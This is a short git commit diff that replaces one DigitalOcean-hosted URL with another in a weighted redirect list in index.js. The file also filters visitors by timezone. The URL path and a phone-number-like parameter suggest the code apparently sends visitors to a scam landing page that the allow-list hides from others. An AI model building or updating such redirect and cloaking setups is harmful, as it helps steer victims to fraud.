993102596d86d24ad223c9ddc905ac2574a2f313
paalakash <palaksh452@gmail.com>
2026-07-10 05:10:34 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://whale-app-qr7i6.ondigitalocean.app/werrx01USAHTML/?bcda=1800-051-206", weight: 1.0 }
+    { url: "https://dolphin-app-4-gzhpe.ondigitalocean.app/werrx01USAHTML/?bcda=1800-051-206", weight: 1.0 }
     
 ];
 
